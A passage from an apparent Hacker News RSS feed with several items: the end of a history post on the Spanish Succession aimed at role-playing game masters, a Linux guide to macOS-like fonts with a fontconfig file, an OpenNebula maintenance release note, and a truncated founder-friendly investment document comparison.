paying France a sum it could not afford and never paid. Furthermore, this was an era where monarchs were believed to have been appointed by God. <em>Could</em> royalty renounce their inheritance? It was unclear.

</p><p id="viewer-eh5fb">It‚Äôs difficult to talk about Louis XIV as a person (in other words, as an NPC) instead of merely as a ruler, because so much of who he was as a person was bound up in <em>being</em> an absolute monarch. His famous quip ‚ÄúI <em>am</em> the state‚Äù kind of sums it up. On top of that, he was a womanizer and a grand patron of the arts. Like Leopold I, he was a fanatical Catholic, but he wasn‚Äôt a strict <em>Roman</em> Catholic. He was a devout Gallican, a long-running strain of Catholicism that holds that there‚Äôs something special about the French church, and that it should be permitted to operate free of interference from Rome.

</p><div id="viewer-70q57"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.moltensulfur.com/post/carving-up-spain" data-pin-media="https://static.wixstatic.com/media/82a6d0_a9bf8649680142a0a4d0b7d690b7244a~mv2.jpg/v1/fit/w_700,h_399,al_c,q_80/file.png" src="https://static.wixstatic.com/media/82a6d0_a9bf8649680142a0a4d0b7d690b7244a~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-5tgm1">So we‚Äôve got the major players assembled. Leopold I had a claim on the Spanish throne down the male line and via his wife. Louis XIV had a superior claim (or his son did) via the female line, though it was somewhat tainted by Marie Theresa‚Äôs renunciation of her inheritance. How did this dispute get resolved?</p><p id="viewer-s1f8">First, there was an attempt at a compromise candidate. Leopold I and Margarita Theresa had a daughter, who had married the Elector of Bavaria and had a son by him, named Joseph Ferdinand. If that son became the King of Spain, it wouldn‚Äôt upset the balance of power; no one cared if Spain and Bavaria were held by the same man. Louis XIV and Leopold I both signed a treaty (the First Partition Treaty) that agreed young Joseph Ferdinand would inherit Spain. In exchange, some Spanish territory in Italy and the Pyrenees would be carved off and given to France and Austria. But Joseph Ferdinand died at age 6, only four months after the First Partition Treaty was signed, so that deal went kaput.</p><p id="viewer-7kd4l">France then met with England behind closed doors to get England‚Äôs sign-off on a Second Partition Treaty. This would give most of the Spanish Empire to Leopold‚Äôs son Karl and give Spain‚Äôs possessions in Italy to France. England signed the treaty, but Leopold did not. He saw Italy as a vulnerable flank France could use to invade Austria. He was willing to pass up a deal that granted him America, the Netherlands, and the Philippines in order to claim Italy.</p><p id="viewer-7gdo4">Carlos (and Spain more broadly) didn‚Äôt like any of this. They didn‚Äôt want to see Spain‚Äôs empire broken up. On September 29th, 1700, Carlos (now sicker than ever) signed a will written by his pro-Habsburg wife. The will designated Leopold‚Äôs son (and Carlos‚Äô nephew) Karl the heir to the empire of Spain. Some of Carlos‚Äô ministers disagreed. They saw France ‚Äì&nbsp;at the time Europe‚Äôs greatest military power ‚Äì&nbsp;as the only nation that could save Spain from being broken apart. They wore down the dying Carlos and on October 30th, convinced him to sign a new will naming Louis XIV‚Äôs grandson as his heir. Carlos II died two days later.</p><p id="viewer-2ffal">Of course, no one outside France or Spain wanted to see the two nations joined. Under international pressure, Louis XIV offered to ignore Carlos‚Äô will and abide by the Second Partition Treaty. Leopold, looking once again at Italy, refused. A Grand Alliance formed to oppose and contain France, and the War of the Spanish Succession raged for thirteen years. Naturally, the war ended in much the same place it began. The other nations of Europe acknowledged Louis XIV‚Äôs grandson as the King of Spain, but France and Spain remained separate and the same man was never king of both.</p><div id="viewer-8piad"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.moltensulfur.com/post/carving-up-spain" data-pin-media="https://static.wixstatic.com/media/82a6d0_8878d4ff487b4be696d8e0c96b9cc91d~mv2.jpg/v1/fit/w_1280,h_749,al_c,q_80/file.png" src="https://static.wixstatic.com/media/82a6d0_8878d4ff487b4be696d8e0c96b9cc91d~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-86l34">In real life, the diplomats failed to find a solution to the crisis of the Spanish Succession. In your fictional campaign setting, things don‚Äôt have to end that way. If you model a succession crisis on this one, powerful movers and shakers might enlist your PCs as diplomats or secret agents. Can the party find (or manufacture) a compromise candidate? Earn the trust of the relevant notables. Find out what they‚Äôd be ‚Ä¶</p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moltensulfur.com/post/carving-up-spain">https://www.moltensulfur.com/post/carving-up-spain</a></em></p>]]>
            </description>
            <link>https://www.moltensulfur.com/post/carving-up-spain</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589190</guid>
            <pubDate>Fri, 25 Sep 2020 12:56:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MacOS-like Fonts on Manjaro/Arch Linux]]>
            </title>
            <description>
<![CDATA[
Score 163 | Comments 146 (<a href="https://news.ycombinator.com/item?id=24588947">thread link</a>) | @aswinmohanme
<br/>
September 25, 2020 | https://aswinmohan.me/posts/better-fonts-on-linux/ | <a href="https://web.archive.org/web/*/https://aswinmohan.me/posts/better-fonts-on-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>Either you love gorgeous typography or just don‚Äôt care. If you are the former read ahead on how to make the font rendering on your Linux look just as awesome as that on macOS, else read on to find out what beauty you have been missing.</p>
<p>I switched to a hackintosh for a while and fell in love with how beautiful the typography was. After returning to Linux and some fiddiling around I came across a not so ugly setup that looked close enough to macOS. So if you want to make your Linux Distro a tad bit typographically better, follow along.</p>
<h3 id="results">Results</h3>
<p>This is how the fonts look on the default installation of Manjaro Linux.
</p><figure>
    <img src="https://aswinmohan.me/images/before_macosfont.png"> <figcaption>
            <h4>Search before font change</h4>
        </figcaption>
</figure>

<figure>
    <img src="https://aswinmohan.me/images/wikipedia_beforefonts.png"> <figcaption>
            <h4>Wikipedia before font change</h4>
        </figcaption>
</figure>

<p>This is how they would look after we are done.
</p><figure>
    <img src="https://aswinmohan.me/images/after_macos.png"> <figcaption>
            <h4>Search after font change</h4>
        </figcaption>
</figure>

<figure>
    <img src="https://aswinmohan.me/images/wikipedia_afterfonts.png"> <figcaption>
            <h4>Wikipedia after font change</h4>
        </figcaption>
</figure>

<h3 id="some-pointers">Some Pointers</h3>
<p>Rather than copy pasting everything on here, let‚Äôs try to understand why the fonts on macOS looks better than the ones we have on Linux.</p>
<p>Fonts belong to certain types.</p>
<ul>
<li><code>sans-serif</code> : Well the sans fonts on your computer. The regular plain fonts.</li>
<li><code>serif</code> : The fonts that look like they came out of a 14th century Bible. You know with the curves and they look like showoffs.</li>
<li><code>monospace</code> : The typical code font. The ones where every character is the same width.</li>
</ul>
<p>The reason fonts look way better on macOS is because Steve Jobs loved typography, and he went the extra mile and licensed some great typefaces for each font type, and recently Apple put in the extra effort to make their custom fonts even better. Well fret not Linux has some free fonts that are metric compatible(means they look awfully similar), and better that we can substitute for fonts.</p>
<h3 id="installation">Installation</h3>
<p>Step one is installing the fonts that look similar or better than the ones on macOS.
All the fonts that are used here can be found on the Arch Repositories, and on Google Fonts. You are free to replace everything with the ones you find great.</p>
<ul>
<li><code>sans-serif</code> : tex-gyre-fonts, free alternative to Helvetica and Arial and looks really really similar</li>
<li><code>serif</code> : Libertinus Serif, suprisingly looks really great</li>
<li><code>monospace</code> : DM Mono from Google Fonts, for monospace fonts that look great</li>
<li><code>emoji</code> : noto-fonts-emoji, get some colorful emojis</li>
</ul>
<p>If you are using Manjaro or Arch here is the command to get all fonts in one go.</p>
<div><pre><code data-lang="fallback">yay -S tex-gyre-fonts otf-libertinus noto-fonts-emoji
</code></pre></div><h3 id="font-setup">Font Setup</h3>
<p>Everything about fonts can be configured from a single file located at <code>/etc/fonts/local.conf</code> if the file doesn‚Äôt exist create it. You do require <code>sudo</code> for it.</p>
<div><pre><code data-lang="fallback">sudo nvim /et/fonts/local.conf
</code></pre></div><p>After you are editing the file copy paste everything here.</p>
<div><pre><code data-lang="fallback">&lt;?xml version='1.0'?&gt;
&lt;!DOCTYPE fontconfig SYSTEM 'fonts.dtd'&gt;
&lt;fontconfig&gt;

&lt;match target="font"&gt;
  &lt;edit name="autohint" mode="assign"&gt;
    &lt;bool&gt;true&lt;/bool&gt;
  &lt;/edit&gt;
  &lt;edit name="hinting" mode="assign"&gt;
    &lt;bool&gt;true&lt;/bool&gt;
  &lt;/edit&gt;
  &lt;edit mode="assign" name="hintstyle"&gt;
    &lt;const&gt;hintslight&lt;/const&gt;
  &lt;/edit&gt;
  &lt;edit mode="assign" name="lcdfilter"&gt;
   &lt;const&gt;lcddefault&lt;/const&gt;
 &lt;/edit&gt;
&lt;/match&gt;


&lt;!-- Default sans-serif font --&gt;
 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;-apple-system&lt;/string&gt;&lt;/test&gt;
   &lt;!--&lt;test qual="any" name="lang"&gt;&lt;string&gt;ja&lt;/string&gt;&lt;/test&gt;--&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Tex Gyre Heros&lt;/string&gt;  &lt;/edit&gt;
 &lt;/match&gt;

 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;Helvetica Neue&lt;/string&gt;&lt;/test&gt;
   &lt;!--&lt;test qual="any" name="lang"&gt;&lt;string&gt;ja&lt;/string&gt;&lt;/test&gt;--&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Tex Gyre Heros&lt;/string&gt;  &lt;/edit&gt;
 &lt;/match&gt;

 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;Helvetica&lt;/string&gt;&lt;/test&gt;
   &lt;!--&lt;test qual="any" name="lang"&gt;&lt;string&gt;ja&lt;/string&gt;&lt;/test&gt;--&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Tex Gyre Heros&lt;/string&gt;  &lt;/edit&gt;
 &lt;/match&gt;

 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;arial&lt;/string&gt;&lt;/test&gt;
   &lt;!--&lt;test qual="any" name="lang"&gt;&lt;string&gt;ja&lt;/string&gt;&lt;/test&gt;--&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Tex Gyre Heros&lt;/string&gt;  &lt;/edit&gt;
 &lt;/match&gt;

 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;sans-serif&lt;/string&gt;&lt;/test&gt;
   &lt;!--&lt;test qual="any" name="lang"&gt;&lt;string&gt;ja&lt;/string&gt;&lt;/test&gt;--&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Tex Gyre Heros&lt;/string&gt;  &lt;/edit&gt;
 &lt;/match&gt;
 
&lt;!-- Default serif fonts --&gt;
 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;serif&lt;/string&gt;&lt;/test&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Libertinus Serif&lt;/string&gt;  &lt;/edit&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Noto Serif&lt;/string&gt;  &lt;/edit&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Noto Color Emoji&lt;/string&gt;  &lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;IPAPMincho&lt;/string&gt;  &lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;HanaMinA&lt;/string&gt;  &lt;/edit&gt;
 &lt;/match&gt;

&lt;!-- Default monospace fonts --&gt;
 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;SFMono-Regular&lt;/string&gt;&lt;/test&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;DM Mono&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Space Mono&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;Inconsolatazi4&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;IPAGothic&lt;/string&gt;&lt;/edit&gt;
 &lt;/match&gt;

 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;Menlo&lt;/string&gt;&lt;/test&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;DM Mono&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Space Mono&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;Inconsolatazi4&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;IPAGothic&lt;/string&gt;&lt;/edit&gt;
 &lt;/match&gt;

 &lt;match target="pattern"&gt;
   &lt;test qual="any" name="family"&gt;&lt;string&gt;monospace&lt;/string&gt;&lt;/test&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;DM Mono&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="prepend" binding="same"&gt;&lt;string&gt;Space Mono&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;Inconsolatazi4&lt;/string&gt;&lt;/edit&gt;
   &lt;edit name="family" mode="append" binding="same"&gt;&lt;string&gt;IPAGothic&lt;/string&gt;&lt;/edit&gt;
 &lt;/match&gt;

&lt;!-- Fallback fonts preference order --&gt;
 &lt;alias&gt;
  &lt;family&gt;sans-serif&lt;/family&gt;
  &lt;prefer&gt;
   &lt;family&gt;Noto Sans&lt;/family&gt;
   &lt;family&gt;Noto Color Emoji&lt;/family&gt;
   &lt;family&gt;Noto Emoji&lt;/family&gt;
   &lt;family&gt;Open Sans&lt;/family&gt;
   &lt;family&gt;Droid Sans&lt;/family&gt;
   &lt;family&gt;Ubuntu&lt;/family&gt;
   &lt;family&gt;Roboto&lt;/family&gt;
   &lt;family&gt;NotoSansCJK&lt;/family&gt;
   &lt;family&gt;Source Han Sans JP&lt;/family&gt;
   &lt;family&gt;IPAPGothic&lt;/family&gt;
   &lt;family&gt;VL PGothic&lt;/family&gt;
   &lt;family&gt;Koruri&lt;/family&gt;
  &lt;/prefer&gt;
 &lt;/alias&gt;
 &lt;alias&gt;
  &lt;family&gt;serif&lt;/family&gt;
  &lt;prefer&gt;
   &lt;family&gt;Noto Serif&lt;/family&gt;
   &lt;family&gt;Noto Color Emoji&lt;/family&gt;
   &lt;family&gt;Noto Emoji&lt;/family&gt;
   &lt;family&gt;Droid Serif&lt;/family&gt;
   &lt;family&gt;Roboto Slab&lt;/family&gt;
   &lt;family&gt;IPAPMincho&lt;/family&gt;
  &lt;/prefer&gt;
 &lt;/alias&gt;
 &lt;alias&gt;
  &lt;family&gt;monospace&lt;/family&gt;
  &lt;prefer&gt;
   &lt;family&gt;Noto Sans Mono&lt;/family&gt;
   &lt;family&gt;Noto Color Emoji&lt;/family&gt;
   &lt;family&gt;Noto Emoji&lt;/family&gt;
   &lt;family&gt;Inconsolatazi4&lt;/family&gt;
   &lt;family&gt;Ubuntu Mono&lt;/family&gt;
   &lt;family&gt;Droid Sans Mono&lt;/family&gt;
   &lt;family&gt;Roboto Mono&lt;/family&gt;
   &lt;family&gt;IPAGothic&lt;/family&gt;
  &lt;/prefer&gt;
 &lt;/alias&gt;

&lt;/fontconfig&gt;
</code></pre></div><p>What this file does that is it creates aliases for the common fonts used on the web and uses the metric compatible fonts that we have. That way we have way better looking fonts.</p>
<p>After you have done all this, restart your computer to see the changes.</p>
<h3 id="chrome">Chrome</h3>
<p>If you are using chrome, you can do something more too.</p>
<ul>
<li>Goto Settings</li>
<li>Select Customize Fonts under Appearences</li>
<li>Set Standard to <code>Libertinus Serif</code></li>
<li>Set Serif to <code>Libertinus Serif</code></li>
<li>Set Sans-serif to <code>TeX Gyre Heros</code></li>
<li>Set Fixed-width to <code>Monospace</code></li>
</ul>
<h3 id="interface-text">Interface Text</h3>
<p>For Desktop Environments like Gnome and KDE, you could use Tex-Gyre-Heros for the overall Helvetica look. I use Gnome 3.36 and use <code>TeX Gyre Heros Regular 10</code> as my interface text.</p>
<p>That‚Äôs all set, and keep in mind this guide will be improved.</p>

			</div></div>]]>
            </description>
            <link>https://aswinmohan.me/posts/better-fonts-on-linux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588947</guid>
            <pubDate>Fri, 25 Sep 2020 12:22:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenNebula EE Maintenance Release 5.12.4 is available]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24588862">thread link</a>) | @amarti
<br/>
September 25, 2020 | https://opennebula.io/ee-maintenance-release-v-5-12-4-is-available/ | <a href="https://web.archive.org/web/*/https://opennebula.io/ee-maintenance-release-v-5-12-4-is-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			    <!-- .entry-header -->

				
					
<article id="post-27558">

    <!-- .entry-header -->

    <div>

		<p>The <strong>Enterprise Edition</strong> of OpenNebula is a tested, hardened, and production-ready version that incorporates additional bug fixes and software patches with minor enhancements developed by OpenNebula Systems.</p>
<p>While we make all our products open source under Apache License Version 2.0, the packages of the<strong> Enterprise Edition</strong> and the <strong>Enterprise Tools</strong> we‚Äôve created for Corporate Users are distributed under commercial license terms only to those customers with an active <a href="https://opennebula.io/subscriptions" target="_blank" rel="noopener noreferrer">OpenNebula Subscription</a>.</p>
<p>The following <strong>issues</strong> have been solved in 5.12.4:</p>
<ul>
<li>Fix DB migration from 5.10 to 5.12.</li>
<li>Fix force IP when instantiate a VM in Sunstone.</li>
<li>Fix for hot disk resize on vCenter.</li>
<li>Fix CLI command onevm disk-attach not setting return code when using a non existing file.</li>
</ul>
<p>If you are a customer with an active<strong> OpenNebula Subscription</strong>, you have immediate access to the packages for this EE Maintenance Release. Please <strong>check your private repository</strong> at the <a href="https://support.opennebula.pro/" target="_blank" rel="noopener noreferrer">OpenNebula Customer Portal</a>.</p>



<figure></figure>
		
		


        <div>
            <p><img alt="" src="https://secure.gravatar.com/avatar/a1737e9efc6920480d8a1abc8d21fd64?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/a1737e9efc6920480d8a1abc8d21fd64?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96">            </p>
            <div>
                <p><span id="autorblog">Michael Abdou</span></p><p>Customer Success Manager at OpenNebula</p>
            </div>
        </div>
	</div><!-- .entry-content -->

</article><!-- #post-## -->

					
<!-- #comments -->

				
			</div></div>]]>
            </description>
            <link>https://opennebula.io/ee-maintenance-release-v-5-12-4-is-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588862</guid>
            <pubDate>Fri, 25 Sep 2020 12:00:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How founder-friendly are KISS vs. SAFE vs. Gust vs. NVCA documents?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24588470">thread link</a>) | @eisaiah_e
<br/>
September 25, 2020 | https://eisaiah.blog/founder-friendly-standard-comparison/ | <a href="https://web.archive.org/web/*/https://eisaiah.blog/founder-friendly-standard-comparison/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<div id="primary">
		<main id="main" role="main">

			
				
<article id="post-13189" class="page">
	<!-- .entry-header -->

	<div>
		<p>Investors can say they are founder-friendly. But the proof is in the paperwork. Click on the bar charts to read how popular investment and term sheet templates compare to Founder Friendly Standard¬Æ ‚Äì performed by six startup attorneys.</p>

<div>
        <div>
        <div>
                        <p>VOTING EQUITY</p>
                        <p>SWEAT EQUITY</p>
                        <p>LEGAL RULES</p>
                        <p>TRANSFERS</p>
                    </div>
                <div data-item="group-1">
            <p><span>500 Startups KISS</span><span>500 Startups KISS</span></p>
            
        </div>
        <div data-item="group-1">
            <div>
                <p><span data-section=""><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_up.png" height="24" width="24" alt="scroll up"></span><span data-section=""><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_down.png" height="24" width="24" alt="scroll down"></span></p>
                <div>
                                                            <div data-id="section-1.1">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 1.1                                        ‚Äì Founder 24 votes per share</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not address founder equity.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-1.2">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 1.2                                        ‚Äì Investor 1 vote per share with liquidation preference</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not address voting rights.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-1.3">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 1.3                                        ‚Äì Employee 1 vote per share</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not address ‚Äúsweat‚Äù equity issued to employees and contractors.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-1.4">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 1.4                                        ‚Äì No special voting rights</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not address board composition or representation.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-1.5">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 1.5                                        ‚Äì No anti-dilution</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not meet section 1.5 of the Founder Friendly Standard. Some KISS terms, including the Valuation Cap, grant investors certain anti-dilution rights.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-2.1">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 2.1                                        ‚Äì Founder performance reviews</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not address performance reviews.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-2.2">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 2.2                                        ‚Äì Founder 4-year vesting</p></div>
                                
                            </div>
                            <p><span>KISS Notes do not address vesting of sweat equity.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-2.3">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 2.3                                        ‚Äì Confidentiality &amp; IP</p></div>
                                
                            </div>
                            <p><span>The KISS Notes do not address founder confidentiality.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-2.4">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 2.4                                        ‚Äì Founder tax warning</p></div>
                                
                            </div>
                            <p><span>The KISS Notes do not address sweat equity or IRC Section 83(b) elections.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-2.5">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 2.5                                        ‚Äì Narrow non-competes</p></div>
                                
                            </div>
                            <p><span>KISS Notes do meet section 2.5 of the Founder Friendly Standard because KISS Notes do not include any non-compete provisions. Remember to compare section 2.5 to future agreements including bylaws and shareholder rights.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-3.1">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 3.1                                        ‚Äì No legal reimbursement</p></div>
                                
                            </div>
                            <p><span>KISS Notes do meet section 3.1 of the Founder Friendly Standard. KISS Notes do not require the company to pay legal fees except where the company does not comply with the KISS agreement.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-3.2">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 3.2                                        ‚Äì No binding arbitration with investors</p></div>
                                
                            </div>
                            <p><span>KISS Notes do meet section 3.2 of the Founder Friendly Standard. KISS Notes do not include an arbitration requirement or provision for investor disputes.</span>
                            </p>
                            <div>
                                <div><p>ANALYSIS BY</p>
                                    <p>Zev Safran, CFA and Attorney, Safran Law PLLC</p></div>
                                <p><span><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/userpics/userpic-zev-safran.png" height="107" width="107"></span></p></div>
                        </div>
                    </div>
                                                                                <div data-id="section-3.3">
                        <div>
                            <div><p>500 Startups KISS</p><p><a><img src="https://eisaiah.blog/wp-content/plugins/infograph/assets/images/icon_close.png" height="32" width="32" alt="close block"></a></p></div>
                            <div>
                                <div><p>FFS 3.3                                        ‚Äì No binding arbitration with founders</p></div>
                                
                            </div>
                            <p><span>KISS Notes do meet section 3.3 of the Founder Friendly Standard. Because KISS Notes do not address founder ‚Ä¶</span></p></div></div></div></div></div></div></div></div></article></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eisaiah.blog/founder-friendly-standard-comparison/">https://eisaiah.blog/founder-friendly-standard-comparison/</a></em></p>]]>
            </description>
